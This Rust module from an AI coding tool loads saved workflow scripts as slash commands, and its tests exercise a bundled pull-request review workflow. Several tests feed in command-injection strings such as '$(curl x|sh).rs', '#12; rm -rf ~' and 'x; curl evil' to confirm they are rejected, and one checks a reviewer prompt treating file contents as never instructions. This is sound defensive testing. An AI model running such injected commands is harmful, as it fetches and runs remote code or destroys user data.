//! Saved workflows: scripts kept as files, each of which becomes a slash
//! command that asks for it to be run.
//!
//! A person's go in `<data>/workflows` and a project's in
//! `.letronna/workflows`, one `.js` file each, named for the file's stem. A
//! project's takes the place of a person's of the same name, as it was
//! written for the code at hand, and either takes the place of the `review`
//! workflow that ships built in. The files are read whenever they are
//! needed, as helper types are, so an edit counts without a restart.
//!
//! They are one more source of `slash::list`, so the front ends offer, list
//! and find them with the commands the user, the project and skills added,
//! and a front end's own commands keep their names. A command only grants
//! the `workflow` tool for its turn and asks the model to call it with the
//! workflow's name, so the run still shows its launch card and waits for the
//! person's approval. Lists and cards name the file a workflow comes from,
//! so a project's file cannot pass for the bundled one it replaces.

use super::host::{self, Find};
use crate::tools::one_line;
use serde_json::json;
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

/// The workflows that ship built in, by name.
const BUNDLED: [(&str, &str); 1] = [("review", include_str!("review.js"))];

/// What a saved workflow's command asks of the model, before the call.
const ASK: &str = "Run the saved workflow \"";

/// What comes between the workflow's name and the call in [`ASK`]'s prompt.
const CALL: &str = "\" with the workflow tool: workflow ";

/// A saved workflow, as a list of commands shows it.
#[derive(Debug, PartialEq)]
pub struct Saved {
    /// Its name, which is its command without the slash.
    pub name: String,
    /// What its meta says it does.
    pub description: String,
    /// The file it comes from, or None for a bundled one.
    pub from: Option<PathBuf>,
    /// Whether that file is the project's rather than the person's.
    pub project: bool,
}

/// Where a saved workflow's script is.
enum Place {
    Bundled(&'static str),
    File(PathBuf),
}

impl Place {
    /// The file the script is kept in, or None for a bundled one.
    fn file(&self) -> Option<PathBuf> {
        match self {
            Place::Bundled(_) => None,
            Place::File(path) => Some(path.clone()),
        }
    }
}

/// Every saved workflow a session in `workspace` can run as a command, by
/// name, with `data` as Letronna's data folder; one whose script has no meta
/// is left out, as a command file that cannot be read is.
pub(crate) fn list(data: &Path, workspace: Option<&Path>) -> Vec<Saved> {
    let project = workspace.map(project_dir);
    let mut saved = Vec::new();
    for (name, place) in found(data, workspace) {
        let Ok(meta) = script(&place).and_then(|script| host::meta(&script)) else {
            continue;
        };
        let from = place.file();
        let theirs = match (&from, &project) {
            (Some(from), Some(dir)) => from.starts_with(dir),
            _ => false,
        };
        saved.push(Saved {
            description: one_line(meta["description"].as_str().unwrap_or_default()),
            from,
            project: theirs,
            name,
        });
    }
    saved
}

/// What to send the model to run the saved workflow `name`, with anything
/// typed after its command as the run's `args`.
pub fn prompt(name: &str, args: &str) -> String {
    let mut call = json!({"name": name});
    if !args.trim().is_empty() {
        call["args"] = args.trim().into();
    }
    format!("{ASK}{name}{CALL}{call}")
}

/// What the user typed for `prompt` when [`prompt`] made it -- `/name` and
/// its args -- so a front end can show that while the model keeps `prompt`.
pub fn typed(prompt: &str) -> Option<String> {
    let (_, call) = prompt.strip_prefix(ASK)?.split_once(CALL)?;
    let call: serde_json::Value = serde_json::from_str(call).ok()?;
    let name = call["name"].as_str()?;
    Some(match call["args"].as_str() {
        Some(args) => format!("/{name} {args}"),
        None => format!("/{name}"),
    })
}

/// The script of the saved workflow called `name` for a session in
/// `workspace`, with the file it comes from unless it is bundled, or why
/// there is none.
pub(crate) fn find(
    workspace: Option<&Path>,
    name: &str,
) -> Result<(String, Option<PathBuf>), String> {
    find_in(&crate::chat::data_dir(), workspace, name)
}

/// Finds the saved workflows a script nests with `workflow()`, for a session
/// in `workspace`.
pub(crate) fn finder(workspace: Option<PathBuf>) -> Find {
    Box::new(move |name| find(workspace.as_deref(), name).map(|(script, _)| script))
}

/// The saved workflows a session in `workspace` has from files, by name, with
/// their files.
pub(crate) fn files(workspace: Option<&Path>) -> Vec<(String, PathBuf)> {
    (found(&crate::chat::data_dir(), workspace).into_iter())
        .filter_map(|(name, place)| place.file().map(|file| (name, file)))
        .collect()
}

fn find_in(
    data: &Path,
    workspace: Option<&Path>,
    name: &str,
) -> Result<(String, Option<PathBuf>), String> {
    let found = found(data, workspace);
    match found.get(name) {
        Some(place) => Ok((script(place)?, place.file())),
        None => {
            let names: Vec<&str> = found.keys().map(String::as_str).collect();
            Err(format!(
                "There is no saved workflow \"{name}\". The saved ones are: {}.",
                names.join(", ")
            ))
        }
    }
}

/// The folder a project keeps its saved workflows in.
fn project_dir(workspace: &Path) -> PathBuf {
    workspace.join(".letronna").join("workflows")
}

/// Every saved workflow by name, with where its script is: the bundled ones,
/// then a person's files, then the project's, each taking the place of an
/// earlier one of the same name.
fn found(data: &Path, workspace: Option<&Path>) -> BTreeMap<String, Place> {
    let mut found: BTreeMap<String, Place> = (BUNDLED.into_iter())
        .map(|(name, script)| (name.to_owned(), Place::Bundled(script)))
        .collect();
    let mut dirs = vec![data.join("workflows")];
    dirs.extend(workspace.map(project_dir));
    for dir in dirs {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for path in entries.flatten().map(|entry| entry.path()) {
            let stem = path.file_stem().and_then(|stem| stem.to_str());
            let Some(name) = stem.filter(|stem| named(stem)).map(str::to_owned) else {
                continue;
            };
            if path.extension().is_some_and(|ext| ext == "js") {
                found.insert(name, Place::File(path));
            }
        }
    }
    found
}

/// The script kept at `place`.
fn script(place: &Place) -> Result<String, String> {
    match place {
        Place::Bundled(script) => Ok((*script).to_owned()),
        Place::File(path) => std::fs::read_to_string(path)
            .map_err(|e| format!("Could not read {}: {e}", path.display())),
    }
}

/// Whether `stem` can be a command's name: one word of letters, digits, `-`
/// and `_`.
fn named(stem: &str) -> bool {
    !stem.is_empty() && (stem.chars()).all(|c| c.is_ascii_alphanumeric() || "-_".contains(c))
}

#[cfg(test)]
mod tests {
    use super::super::tests::{Asked, Data, answering, report};
    use super::*;
    use crate::driver::{Outcome, Report};
    use host::End;
    use std::sync::mpsc;
    use std::time::Duration;

    /// A workflow file that says `description` of itself.
    fn workflow(description: &str) -> String {
        format!("export const meta = {{ name: \"test\", description: \"{description}\" }};\n")
    }

    /// An empty folder of the test's own, standing in for Letronna's data.
    fn scratch(name: &str) -> PathBuf {
        let dir =
            std::env::temp_dir().join(format!("letronna-saved-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn write(dir: &Path, file: &str, text: &str) {
        std::fs::create_dir_all(dir).unwrap();
        std::fs::write(dir.join(file), text).unwrap();
    }

    #[test]
    fn a_project_workflow_overrides_a_user_one() {
        let data = scratch("override");
        let project = data.join("project");
        let user = data.join("workflows");
        write(&user, "triage.js", &workflow("The user's own."));
        write(&user, "review.js", &workflow("The user's review."));
        write(&user, "notes.txt", "Not a workflow.");
        write(&user, "two words.js", &workflow("Not a command's name."));
        write(&user, "broken.js", "return 1;\n");
        // Runs keep their folders beside the user's workflows.
        std::fs::create_dir_all(user.join("wf-1")).unwrap();
        let letronna = project.join(".letronna").join("workflows");
        write(&letronna, "triage.js", &workflow("The project's."));

        let saved = list(&data, Some(&project));
        let shown: Vec<(&str, &str, Option<&Path>, bool)> = (saved.iter())
            .map(|saved| {
                let from = saved.from.as_deref();
                let name = saved.name.as_str();
                (name, saved.description.as_str(), from, saved.project)
            })
            .collect();
        assert_eq!(
            shown,
            [
                (
                    "review",
                    "The user's review.",
                    Some(&*user.join("review.js")),
                    false
                ),
                (
                    "triage",
                    "The project's.",
                    Some(&*letronna.join("triage.js")),
                    true
                )
            ]
        );
        let found = |workspace: Option<&Path>| find_in(&data, workspace, "triage").unwrap().0;
        assert!(found(Some(&project)).contains("The project's."));
        assert!(found(None).contains("The user's own."));
        // Only the bundled one comes from no file.
        assert_eq!(
            find_in(&scratch("bundled"), None, "review").unwrap().1,
            None
        );
        assert_eq!(
            find_in(&data, None, "nothing"),
            Err(
                "There is no saved workflow \"nothing\". The saved ones are: broken, review, \
                 triage."
                    .into()
            )
        );
        std::fs::remove_dir_all(data).unwrap();
    }

    #[test]
    fn a_command_asks_for_the_workflow_by_name_with_what_follows_as_args() {
        // The call's keys come in either order, as serde_json's features have it.
        let call = |args: &str| {
            let text = prompt("review", args);
            let prefix = "Run the saved workflow \"review\" with the workflow tool: workflow ";
            serde_json::from_str::<serde_json::Value>(text.strip_prefix(prefix).unwrap()).unwrap()
        };
        assert_eq!(call("  main "), json!({"name": "review", "args": "main"}));
        assert_eq!(call(""), json!({"name": "review"}));
    }

    #[test]
    fn a_saved_workflow_prompt_shows_as_it_was_typed() {
        for (args, shown) in [("  main ", "/review main"), ("", "/review")] {
            assert_eq!(typed(&prompt("review", args)).as_deref(), Some(shown));
        }
        assert_eq!(typed("review this"), None);
        assert_eq!(typed("Run the saved workflow \"review\" now"), None);
    }

    #[test]
    fn the_bundled_workflow_parses() {
        for (name, script) in BUNDLED {
            let meta = host::meta(script).unwrap();
            assert_eq!(meta["name"], name);
        }
        let meta = host::meta(BUNDLED[0].1).unwrap();
        let phases: Vec<&str> = (meta["phases"].as_array().unwrap().iter())
            .map(|phase| phase["title"].as_str().unwrap())
            .collect();
        assert_eq!(phases, ["Find", "Review", "Verify", "Report"]);
    }

    #[test]
    fn the_bundled_review_reports_what_the_votes_upheld() {
        let data = Data::new("saved-review");
        let asked_for = Asked::default();
        let run = data.run(
            None,
            answering(&asked_for, |task| {
                let value = if task.starts_with("Run `git diff") {
                    json!({"ran": true, "tip": false, "files": ["a.rs", "b.rs"], "added": []})
                } else if task.starts_with("Review the change to a.rs") {
                    json!({"items": [{"line": 3, "problem": "It panics on an empty line."}]})
                } else if task.starts_with("Review") {
                    json!({"items": []})
                } else if task.starts_with("Claim") {
                    json!({"real": true, "reason": "It does."})
                } else {
                    return report(Outcome::Done, "The report.");
                };
                let mut answer = report(Outcome::Done, "");
                answer.value = Some(value);
                answer
            }),
        );
        let (sent, got) = mpsc::channel();
        let then = move |end| sent.send(end).unwrap();
        host::start(run, BUNDLED[0].1, &json!("main"), finder(None), then).unwrap();

        let end = got.recv_timeout(Duration::from_secs(60)).unwrap();
        assert_eq!(end, End::Returned(json!("The report.")));
        let asked = asked_for.lock().unwrap();
        // The list, a reviewer for each file, three votes and the report.
        assert_eq!(asked.len(), 7);
        assert!(asked[0].starts_with("Run `git diff --merge-base main --name-only`"));
        assert!(asked[6].contains("\"line\":3,\"problem\":\"It panics on an empty line.\""));
    }

    /// How the bundled review run with `args` ends when its helpers answer as
    /// `answer` makes them, and the tasks they were given.
    fn review(
        data: &Data,
        args: serde_json::Value,
        answer: fn(&str) -> Report,
    ) -> (End, Vec<String>) {
        let asked_for = Asked::default();
        let run = data.run(None, answering(&asked_for, answer));
        let (sent, got) = mpsc::channel();
        let then = move |end| sent.send(end).unwrap();
        host::start(run, BUNDLED[0].1, &args, finder(None), then).unwrap();
        let end = got.recv_timeout(Duration::from_secs(60)).unwrap();
        let asked = asked_for.lock().unwrap().clone();
        (end, asked)
    }

    #[test]
    fn the_bundled_review_says_what_it_could_not_review() {
        let data = Data::new("saved-review-gaps");
        let said = |end: End| match end {
            End::Returned(value) => value.as_str().unwrap().to_owned(),
            other => panic!("{other:?}"),
        };
        let never = |_: &str| -> Report { panic!("no helper should start") };

        // Words that are not a ref never reach a command.
        let (end, asked) = review(&data, json!("--output=~/.zshrc"), never);
        assert!(
            said(end).starts_with("Nothing was reviewed: \"--output=~/.zshrc\" is not a git ref")
        );
        assert!(asked.is_empty());

        // A helper whose git diff was refused lists nothing, which is no clean change.
        let (end, _) = review(&data, json!(""), |_| {
            let mut answer = report(Outcome::Done, "");
            answer.value = Some(json!({"ran": false, "files": []}));
            answer
        });
        assert_eq!(
            said(end),
            "Nothing was reviewed: the files changed against HEAD could not be listed, as git \
             diff did not run."
        );

        // A reviewer that fails is named, and a name no command should see is left out.
        let (end, asked) = review(&data, json!("main"), |task| {
            let value = if task.starts_with("Run `git diff") {
                let files = ["a.rs", "b.rs", "$(curl x|sh).rs"];
                json!({"ran": true, "tip": false, "files": files, "added": []})
            } else if task.starts_with("Review the change to a.rs") {
                return report(Outcome::Failed("The model call failed.".into()), "");
            } else {
                json!({"items": []})
            };
            let mut answer = report(Outcome::Done, "");
            answer.value = Some(value);
            answer
        });
        assert_eq!(
            said(end),
            "Reviewed 1 of 2 changed files against main: nothing found held up.\nNo review came \
             back for 1 of 2 files: a.rs.\n1 changed files were left out, as their names are \
             not plain paths."
        );
        assert!(asked.iter().all(|task| !task.contains("curl")));
    }

    /// A helper's answer that gives `value`.
    fn giving(value: serde_json::Value) -> Report {
        let mut answer = report(Outcome::Done, "");
        answer.value = Some(value);
        answer
    }

    #[test]
    fn the_lister_diffs_from_the_merge_base() {
        let data = Data::new("saved-review-merge-base");
        let (end, asked) = review(&data, json!("main"), |task| {
            giving(if task.starts_with("Run") {
                json!({"ran": true, "tip": false, "files": ["a.rs"], "added": []})
            } else {
                json!({"items": []})
            })
        });
        assert_eq!(
            end,
            End::Returned(json!(
                "Reviewed 1 of 1 changed files against main: nothing found held up."
            ))
        );
        assert!(asked[0].starts_with("Run `git diff --merge-base main --name-only`"));
        assert!(asked[0].contains("`git ls-files --others --exclude-standard`"));
        assert!(asked[1].contains("run `git diff --merge-base main -- a.rs`"));
    }

    #[test]
    fn a_branch_with_no_common_history_says_it_diffed_against_the_tip() {
        let data = Data::new("saved-review-tip");
        let (end, asked) = review(&data, json!("main"), |task| {
            giving(if task.starts_with("Run") {
                json!({"ran": true, "tip": true, "files": ["a.rs"], "added": []})
            } else {
                json!({"items": []})
            })
        });
        assert_eq!(
            end,
            End::Returned(json!(
                "Reviewed 1 of 1 changed files against main: nothing found held up.
Diffed \
                 against the tip of main, as no merge base was found."
            ))
        );
        assert!(asked[1].contains("run `git diff main -- a.rs`"));
    }

    #[test]
    fn an_untracked_file_reaches_a_reviewer_with_the_read_it_whole_prompt() {
        let data = Data::new("saved-review-new");
        let (end, asked) = review(&data, json!(""), |task| {
            if task.starts_with("Write") {
                return report(Outcome::Done, "The report.");
            }
            giving(if task.starts_with("Run") {
                json!({"ran": true, "tip": false, "files": [], "added": ["new.rs", "logo.png"]})
            } else if task.starts_with("Review the change to new.rs") {
                json!({"items": [{"line": 2, "problem": "It never closes the file."}]})
            } else if task.starts_with("Review") {
                json!({"items": [], "unread": true})
            } else {
                json!({"real": true, "reason": "It does not."})
            })
        });
        assert_eq!(
            end,
            End::Returned(json!(
                "The report.\n\n1 new files were not read, as they are not text or run past \
                 1,500 lines: logo.png."
            ))
        );
        let reviewer = asked
            .iter()
            .find(|task| task.contains("to new.rs"))
            .unwrap();
        assert!(reviewer.starts_with(
            "Review the change to new.rs: it is new and git does not track it yet, so read all \
             of it and review it as an addition."
        ));
        assert!(!reviewer.contains("git diff"));
        // The list, a reviewer for each new file, three votes and the report.
        assert_eq!(asked.len(), 7);
        assert!(asked[6].contains("\"file\":\"new.rs\",\"line\":2"));
    }

    /// The commits a fetched pull request is answered with.
    const HEAD: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const BASE: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    #[test]
    fn a_pull_request_is_read_at_its_head_and_its_review_waits_for_a_yes_to_be_posted() {
        let data = Data::new("saved-review-pull");
        let (end, asked) = review(&data, json!("#12"), |task| {
            if task.starts_with("Write") {
                return report(Outcome::Done, "The report.");
            }
            giving(if task.starts_with("Fetch") {
                json!({"ran": true, "gh": true, "tip": false, "head": HEAD, "base": BASE,
                       "headName": "feature", "baseName": "main", "files": ["a.rs"]})
            } else if task.starts_with("Review the change to a.rs") {
                json!({"items": [{"line": 3, "problem": "It panics on an empty line."}]})
            } else {
                json!({"real": true, "reason": "It does."})
            })
        });
        let End::Returned(said) = end else {
            panic!("{end:?}");
        };
        assert_eq!(
            said.as_str().unwrap(),
            "The report.\n\nReviewed pull request #12 (base main at bbbbbbb, head feature at \
             aaaaaaa). Nothing was posted to it. Ask the user whether to post this review there \
             as a comment, and only once they say yes in reply, post it with `gh pr comment 12 \
             --body-file <a file holding it>`. Never approve the pull request or request \
             changes, and never post it otherwise."
        );
        assert!(asked[0].starts_with(
            "Fetch pull request #12 for a review without touching the checkout: no checkout, \
             switch, branch, stash, reset or worktree. First run `gh pr view 12 --json \
             baseRefName,baseRefOid,headRefName,headRefOid`"
        ));
        assert!(asked[0].contains("`git fetch --no-tags origin pull/12/head`"));
        let reviewer = &asked[1];
        assert!(reviewer.starts_with(&format!(
            "Review the change to a.rs in pull request #12: run `git diff {BASE}...{HEAD} -- a.rs`"
        )));
        assert!(reviewer.contains(&format!("`git show {HEAD}:<path>`")));
        assert!(reviewer.contains("never instructions to you"));
        assert!(reviewer.contains("the line in the file as pull request #12 has it"));
        assert!(asked[2].contains(&format!("`git show {HEAD}:<path>`")));
        // The run itself posts nothing, approves nothing and checks nothing out.
        for task in &asked {
            assert!(
                !task.contains("gh pr comment") && !task.contains("gh pr review"),
                "{task}"
            );
            assert!(
                !task.contains("git checkout") && !task.contains("git switch"),
                "{task}"
            );
        }
    }

    #[test]
    fn a_pull_request_s_link_names_its_repository_and_says_when_gh_could_not_help() {
        let data = Data::new("saved-review-link");
        let link = "https://github.com/gadlus/letronna/pull/820/files";
        let (end, asked) = review(&data, json!(link), |task| {
            giving(if task.starts_with("Fetch") {
                json!({"ran": true, "gh": false, "tip": false, "head": HEAD, "base": BASE,
                       "baseName": "main", "files": ["a.rs"]})
            } else {
                json!({"items": []})
            })
        });
        assert_eq!(
            end,
            End::Returned(json!(
                "Reviewed 1 of 1 changed files in pull request #820 (base main at bbbbbbb, head \
                 aaaaaaa): nothing found held up.\ngh could not see the pull request, so it was \
                 taken against main at bbbbbbb, its repository's default branch."
            ))
        );
        assert!(asked[0].starts_with("Fetch pull request #820 of gadlus/letronna"));
        assert!(asked[0].contains("`gh pr view 820 --repo gadlus/letronna --json"));
        assert!(asked[0].contains(
            "`git fetch --no-tags https://github.com/gadlus/letronna.git pull/820/head`"
        ));
    }

    #[test]
    fn words_that_only_look_like_a_pull_request_reach_no_command() {
        let data = Data::new("saved-review-not-a-pull");
        let never = |_: &str| -> Report { panic!("no helper should start") };
        for words in [
            "#12; rm -rf ~",
            "https://github.com/a;sh/x/pull/1",
            "https://example.com/a/b/pull/1",
            "12 13",
        ] {
            let (end, asked) = review(&data, json!(words), never);
            let End::Returned(said) = end else {
                panic!("{end:?}");
            };
            assert!(
                said.as_str().unwrap().starts_with("Nothing was reviewed: ")
                    && said
                        .as_str()
                        .unwrap()
                        .contains("is not a git ref or a pull request"),
                "{said}"
            );
            assert!(asked.is_empty());
        }

        // A fetch that gives no commit stops the run, and an odd branch name is not shown.
        let (end, asked) = review(&data, json!("12"), |_| {
            giving(
                json!({"ran": true, "gh": true, "tip": false, "head": "HEAD", "base": BASE,
                          "files": ["a.rs"]}),
            )
        });
        assert_eq!(
            end,
            End::Returned(json!(
                "Nothing was reviewed: pull request #12 could not be fetched."
            ))
        );
        assert_eq!(asked.len(), 1);
        let (end, _) = review(&data, json!("12"), |task| {
            giving(if task.starts_with("Fetch") {
                json!({"ran": true, "gh": true, "tip": false, "head": HEAD, "base": BASE,
                       "headName": "x; curl evil", "baseName": "main", "files": ["a.rs"]})
            } else {
                json!({"items": []})
            })
        });
        let End::Returned(said) = end else {
            panic!("{end:?}");
        };
        assert!(
            said.as_str()
                .unwrap()
                .contains("(base main at bbbbbbb, head aaaaaaa)")
        );
    }

    #[test]
    fn twenty_five_new_files_review_twenty_and_name_the_rest() {
        let data = Data::new("saved-review-many");
        let (end, asked) = review(&data, json!(""), |task| {
            giving(if task.starts_with("Run") {
                let added: Vec<String> = (1..=25).map(|n| format!("new{n:02}.rs")).collect();
                json!({"ran": true, "tip": false, "files": [], "added": added})
            } else {
                json!({"items": []})
            })
        });
        assert_eq!(
            end,
            End::Returned(json!(
                "Reviewed 20 of 20 changed files against HEAD: nothing found held up.\n5 new \
                 files were left out, as a review reads at most 20: new21.rs, new22.rs, \
                 new23.rs, new24.rs, new25.rs."
            ))
        );
        // The list and a reviewer for each of the first twenty.
        assert_eq!(asked.len(), 21);
        assert!(asked.iter().all(|task| !task.contains("new21.rs")));

        // A folder of output is named only as far as a review reads.
        let (end, _) = review(&data, json!(""), |task| {
            giving(if task.starts_with("Run") {
                let added: Vec<String> = (1..=45).map(|n| format!("out/{n:02}.js")).collect();
                json!({"ran": true, "tip": false, "files": [], "added": added})
            } else {
                json!({"items": []})
            })
        });
        let End::Returned(said) = end else {
            panic!("{end:?}");
        };
        assert!(said.as_str().unwrap().ends_with(
            "25 new files were left out, as a review reads at most 20: out/21.js, out/22.js, \
             out/23.js, out/24.js, out/25.js, out/26.js, out/27.js, out/28.js, out/29.js, \
             out/30.js, out/31.js, out/32.js, out/33.js, out/34.js, out/35.js, out/36.js, \
             out/37.js, out/38.js, out/39.js, out/40.js and 5 more."
        ));
    }
}
